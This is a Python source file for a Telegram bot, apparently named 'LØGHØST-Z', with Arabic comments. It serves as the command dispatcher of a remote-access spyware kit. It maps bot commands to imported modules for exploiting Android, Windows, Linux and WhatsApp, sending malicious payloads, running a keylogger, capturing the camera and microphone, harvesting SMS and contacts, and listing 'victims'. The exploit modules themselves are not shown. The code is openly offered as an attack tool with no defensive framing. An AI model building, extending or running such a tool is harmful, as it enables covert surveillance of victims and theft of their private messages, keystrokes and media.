#!/usr/bin/env python3
# 🔱 LØGHØST-Z 💀 – البوت الخارق الشامل
# 👨‍💻 المطور: @Venom400

import os
import json
import logging
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from telegram.request import HTTPXRequest

from database import init_db
from admin import admin_panel, show_victims, show_logs, export_csv
from exploits import exploit_android, exploit_windows, exploit_linux, exploit_whatsapp
from payloads import send_payload, generate_payload
from keylogger import start_keylogger, stop_keylogger, get_keylogs
from camera import capture_camera
from mic import record_mic
from sms import get_sms
from contacts import get_contacts
from crypto_cracker import decrypt_file_command, decrypt_base64_cmd, decrypt_xor_cmd, decrypt_aes_cmd

# ======== تحميل الإعدادات ========
with open("config.json", "r") as f:
    config = json.load(f)

TOKEN = config["BOT_TOKEN"]
ADMIN_IDS = config["ADMIN_IDS"]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
init_db()

# ============================================
# 1. أوامر البوت
# ============================================
async def start(update, context):
    from admin import admin_panel
    await admin_panel(update, context)

async def help_command(update, context):
    help_msg = (
        "🔱 **أوامر البوت الخارق**\n\n"
        "/start - لوحة التحكم\n"
        "/admin - لوحة الإدارة\n"
        "/exploit_android - استغلال Android\n"
        "/exploit_windows - استغلال Windows\n"
        "/exploit_linux - استغلال Linux\n"
        "/exploit_whatsapp - استغلال WhatsApp\n"
        "/send_payload - إرسال حمولة خبيثة\n"
        "/keylogger - تشغيل كيلوغر\n"
        "/camera - تصوير الكاميرا\n"
        "/mic - تسجيل الميكروفون\n"
        "/sms - سحب الرسائل النصية\n"
        "/contacts - سحب جهات الاتصال\n"
        "/victims - عرض الضحايا\n"
        "/logs - عرض السجلات\n\n"
        "🔓 **أوامر فك التشفير**\n"
        "/decrypt - فك تشفير ملف بايثون\n"
        "/base64 - فك Base64\n"
        "/xor - فك XOR\n"
        "/aes - فك AES"
    )
    await update.message.reply_text(help_msg, parse_mode="Markdown")

# ============================================
# 2. تشغيل البوت
# ============================================
def main():
    request = HTTPXRequest(connect_timeout=30.0, read_timeout=60.0)
    app = Application.builder().token(TOKEN).request(request).build()

    # الأوامر الأساسية
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("exploit_android", exploit_android))
    app.add_handler(CommandHandler("exploit_windows", exploit_windows))
    app.add_handler(CommandHandler("exploit_linux", exploit_linux))
    app.add_handler(CommandHandler("exploit_whatsapp", exploit_whatsapp))
    app.add_handler(CommandHandler("send_payload", send_payload))
    app.add_handler(CommandHandler("keylogger", start_keylogger))
    app.add_handler(CommandHandler("camera", capture_camera))
    app.add_handler(CommandHandler("mic", record_mic))
    app.add_handler(CommandHandler("sms", get_sms))
    app.add_handler(CommandHandler("contacts", get_contacts))
    app.add_handler(CommandHandler("victims", show_victims))
    app.add_handler(CommandHandler("logs", show_logs))
    app.add_handler(CommandHandler("export", export_csv))

    # أوامر فك التشفير
    app.add_handler(CommandHandler("decrypt", decrypt_file_command))
    app.add_handler(CommandHandler("base64", decrypt_base64_cmd))
    app.add_handler(CommandHandler("xor", decrypt_xor_cmd))
    app.add_handler(CommandHandler("aes", decrypt_aes_cmd))

    # معالجات
    app.add_handler(CallbackQueryHandler(admin_panel))

    logger.info("💀 البوت الخارق يعمل...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
